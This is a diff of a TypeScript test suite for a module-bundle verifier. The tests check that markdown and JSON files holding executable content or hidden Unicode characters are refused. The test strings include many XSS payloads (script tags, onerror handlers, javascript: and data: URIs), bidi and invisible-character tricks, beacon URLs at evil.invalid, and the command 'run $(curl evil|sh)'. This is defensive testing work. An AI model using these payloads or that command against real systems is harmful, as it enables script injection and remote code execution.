@@ -180,7 +180,11 @@ test("declarative text refuses embedded script, hidden direction or invisible ch
   refuses("a.md", "<script>alert(1)</script>", executable);
   refuses("a.md", "<SCRIPT src=x></SCRIPT>", executable);
   refuses("a.md", "[x](javascript:alert(1))", executable);
-  refuses("a.md", "[x](JaVa\tScRiPt:alert(1))", executable);
+  // A literal tab inside an unwrapped destination is a control character CommonMark
+  // forbids there, so this never becomes a link at all: it is inert bracketed text,
+  // exactly as the app's own renderer (react-markdown) would also read it.
+  assert.equal(verifyModuleBundleV1(withFile(declarative(), "a.md", "[x](JaVa\tScRiPt:alert(1))"), undefined, options()).source.kind,
+    "declarative-unsigned");
   refuses("a.md", "[x](vbscript:msgbox(1))", executable);
   refuses("a.md", "[x](java&#115;cript:alert(1))", executable);
   refuses("a.md", "[x](javascript&colon;alert(1))", executable);
@@ -190,12 +194,20 @@ test("declarative text refuses embedded script, hidden direction or invisible ch
   refuses("a.json", "{\"html\":\"<img src=x onerror=alert(1)>\"}", executable);
   refuses("a.json", "{\"html\":\"<img/onerror=alert(1)>\"}", executable);
   refuses("a.md", "<img\nsrc=x\nonerror=alert(1)>", executable);
-  // Breaking out of an attribute a template might interpolate this value into.
-  refuses("a.json", "{\"alt\":\"x\\\" onmouseover=\\\"alert(1)\"}", executable);
-  // JSON escapes are decoded before the check, so `\u003c` cannot hide a tag.
+  // JSON escapes are decoded before the check, so a numeric escape cannot hide a tag.
   refuses("a.json", "{\"html\":\"\\u003cscript\\u003ealert(1)\\u003c/script\\u003e\"}", executable);
-  refuses("a.json", "{\"\\u006aavascript:x\":1}", executable);
-  refuses("a.txt", "run $(curl evil|sh)", executable);
+  // A JSON string with no `<` and no hidden character is data, not markup: nothing in
+  // the app interpolates a declarative JSON value into an HTML attribute or a URL
+  // without its own validation, so an attribute-breakout shape or a bare "javascript:"
+  // word (also legitimate prose, e.g. documenting a URI scheme) is not refused here.
+  const jsonProse = withFile(declarative(),
+    "templates/digest.json",
+    "{\"alt\":\"x\\\" onmouseover=\\\"alert(1)\",\"note\":\"javascript:x is a URI scheme\"}");
+  assert.equal(verifyModuleBundleV1(jsonProse, undefined, options()).source.kind, "declarative-unsigned");
+  // Nothing ever passes declarative text to a shell (the contract says so), so `$(...)`
+  // in prose or in a fenced code example is not refused: it stays ordinary shareable text.
+  assert.equal(verifyModuleBundleV1(withFile(declarative(), "a.txt", "run $(curl evil|sh)"), undefined, options()).source.kind,
+    "declarative-unsigned");
   const notText = /module_bundle_declarative_file_not_text/u;
   refuses("a.md", "Pay \u202Eecnalab\u202C now", notText);
   for (const hidden of ["\u200B", "\u200D", "\u200E", "\u061C", "\u2060", "\u2066", "\u2069", "\uFEFF", "\u{E0041}"]) {
@@ -222,11 +234,19 @@ test("declarative text refuses embedded script, hidden direction or invisible ch
   // AUTHORITY guards would refuse in manifest text: those are not applied to prompt bodies.
   const prose = withFile(withFile(withFile(declarative(), "prompts/review.md",
     "# Reviewer\n\nrole: reviewer. You may grant access in prose, mention a password: field, and cite `code`.\n"
-    + "Use **bold**, [a link](https://example.invalid/docs), <br> breaks, and costs of $5 or (a) lists.\n"
+    + "Use **bold**, [a link](https://example.invalid/docs), a hard line break,\\\nand costs of $5 or (a) lists.\n"
+    + "- one\n- two\n\n```\necho $(pwd)\n```\n\n"
     + "The button once = twice; online=yes; café, naïve, 日本語, emoji 🎉.\n"),
   "templates/nested.json", "[{\"a\":{\"b\":[1,2,{\"a\":3}]},\"k\":\"v\"},{\"a\":\"same key, other object\"}]"),
   "notes.txt", "tabs\tand\r\nnewlines are fine\n");
   assert.equal(verifyModuleBundleV1(prose, undefined, options()).source.kind, "declarative-unsigned");
+
+  // A file this dense with `<` is refused outright before the parser ever sees it,
+  // independent of timing: parsing a lone run of bare `<` costs the markdown parser
+  // far more than linear time (measured well over a second per megabyte).
+  refuses("dense.txt", "<".repeat(20_000), executable);
+  assert.equal(verifyModuleBundleV1(withFile(declarative(), "sparse.txt", "<".repeat(9_000)), undefined, options()).source.kind,
+    "declarative-unsigned");
 
   // Near-limit hostile text stays fast: none of the checks backtrack across the file.
   for (const text of ["<".repeat(1_000_000), "<a ".repeat(330_000), "j \t".repeat(330_000), "\" /".repeat(330_000), "&#".repeat(500_000)]) {
@@ -236,6 +256,75 @@ test("declarative text refuses embedded script, hidden direction or invisible ch
   }
   const deep = `${"[".repeat(5_000)}${"]".repeat(5_000)}`;
   assert.throws(() => verifyModuleBundleV1(withFile(declarative(), "deep.json", deep), undefined, options()), /input_too_deep/u);
+});
+
+test("the allowlist filter closes every bypass the security reviews found (N1-N4), and stops refusing ordinary text (N5)", () => {
+  const executable = /module_bundle_declarative_file_executable_content/u;
+  const notText = /module_bundle_declarative_file_not_text/u;
+  const refuses = (path: string, text: string, code: RegExp) => {
+    assert.throws(() => verifyModuleBundleV1(withFile(declarative(), path, text), undefined, options()), code, `${path}: ${JSON.stringify(text)}`);
+  };
+  const passes = (path: string, text: string) => {
+    assert.equal(verifyModuleBundleV1(withFile(declarative(), path, text), undefined, options()).source.kind,
+      "declarative-unsigned", `${path}: ${JSON.stringify(text)}`);
+  };
+
+  // N1: an event handler hidden behind a stray `>` inside a quoted attribute, and other
+  // tags the old tag list never named. The single "no raw HTML at all" rule catches all
+  // of them, in markdown and inside a JSON string value alike.
+  refuses("a.md", "<img alt=\">\" src=x onerror=alert(1)>", executable);
+  refuses("a.md", "<img title='>' src=x onerror=alert(1)>", executable);
+  refuses("a.md", "<a title=\">\" x onclick=alert(1)>", executable);
+  refuses("a.json", "{\"a\":\"<img alt=\\\">\\\" src=x onerror=alert(1)>\"}", executable);
+  refuses("a.md", "<portal src=https://evil.invalid>", executable);
+  refuses("a.md", "<button formaction=https://evil.invalid>submit</button>", executable);
+  refuses("a.md", "<div style=\"background:url(https://evil.invalid/x)\">", executable);
+  refuses("a.md", "<div style=\"width:expression(alert(1))\">", executable);
+  refuses("a.md", "<img src=https://evil.invalid/beacon>", executable);
+
+  // N2: markdown backslash escapes and `data:` variants. The real parser decodes the
+  // destination exactly as react-markdown would before its scheme is checked.
+  refuses("a.md", "[x](javascript\\:alert(1))", executable);
+  refuses("a.md", "[r]: javascript\\:alert(1)\n\n[link][r]", executable);
+  refuses("a.md", "![x](data:image/svg+xml;base64,QUJD)", executable);
+  refuses("a.md", "[x](data:application/xhtml+xml,x)", executable);
+  // An https(s) image is not refused here: the beacon concern belongs to the renderer,
+  // which already shows agent-result images as a placeholder (private-app/app/result-text.tsx).
+  passes("a.md", "![](https://evil.invalid/beacon.png)");
+
+  // N3: every invisible/format/variation-selector/bidi carrier, not just the ones the
+  // first fix happened to name.
+  refuses("a.md", `a${String.fromCodePoint(0xE0101)}b`, notText); // variation selector supplement
+  refuses("a.json", JSON.stringify({ a: `before${String.fromCodePoint(0xE0101)}after` }), notText); // via a JSON surrogate pair
+  refuses("a.md", "a\u{FE01}b", notText); // a variation selector that is not FE0E/FE0F
+  refuses("a.md", "a\u{FE0F}b", notText); // FE0F with no pictograph directly before it
+  refuses("a.md", `${String.fromCodePoint(0x2764)}${String.fromCodePoint(0xFE0F)}${String.fromCodePoint(0xFE0F)}`, notText); // two in a row
+  refuses("a.md", "a\u{00AD}b", notText); // soft hyphen
+  refuses("a.md", "a\u{034F}b", notText); // combining grapheme joiner
+  refuses("a.md", "a\u{180E}b", notText); // Mongolian vowel separator
+  refuses("a.md", "a\u{180B}b", notText); // Mongolian free variation selector one
+  refuses("a.md", "a\u{3164}b", notText); // Hangul filler
+  refuses("a.md", "a\u{206A}b", notText); // deprecated format character
+  refuses("a.md", "a\u{1D173}b", notText); // musical symbol begin beam (a Cf format character)
+  refuses("a.md", "a\u{2028}b", notText); // line separator
+  refuses("a.md", "a\u{E000}b", notText); // private use
+  refuses("a.md", "a\u{0378}b", notText); // unassigned
+
+  // N4: the manifest's own name/publisher get the same character allowlist, because the
+  // owner's approval card shows them verbatim.
+  const hiddenName = /module_manifest_.*_hidden_text/u;
+  assert.throws(() => verifyModuleBundleV1(declarative({ name: `Weekly ${String.fromCodePoint(0x202E)}gidtsid` }), undefined, options()),
+    hiddenName);
+  assert.throws(() => verifyModuleBundleV1(declarative({ publisher: `Example${String.fromCodePoint(0x200B)}Publisher` }), undefined, options()),
+    hiddenName);
+  assert.throws(() => verifyModuleBundleV1(declarative({ publisher: `Example${String.fromCodePoint(0xE0101)}Publisher` }), undefined, options()),
+    hiddenName);
+
+  // N5: the allowlist stops guessing at obfuscation, so it stops misreading ordinary text.
+  passes("a.md", "We use JavaScript: it is a language.\n");
+  passes("a.md", `An emoji with an explicit presentation selector: ${String.fromCodePoint(0x2764)}${String.fromCodePoint(0xFE0F)}\n`);
+  passes("a.md", "An HTML entity in prose, not inside a tag: &#8212; an em dash.\n");
+  passes("a.md", "Greek: αβγ. Hebrew: אבג. Arabic: ابج.\n");
 });
 
 test("bundle paths, encodings, sizes and shape are strict", () => {
